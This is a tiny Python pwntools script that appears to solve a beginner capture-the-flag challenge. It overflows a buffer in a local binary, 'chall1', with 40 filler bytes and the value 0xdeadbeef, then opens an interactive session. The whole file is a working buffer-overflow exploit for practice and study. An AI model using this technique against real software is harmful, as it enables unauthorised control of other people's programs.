#!/usr/bin/python3

from pwn import * 

p = process("./chall1")

offset = 40
paylaod = 'A'*offset +'\xef\xbe\xad\xde'  # deadbeef ---> ef + be + ad + de

p.sendline(paylaod)
p.interactive()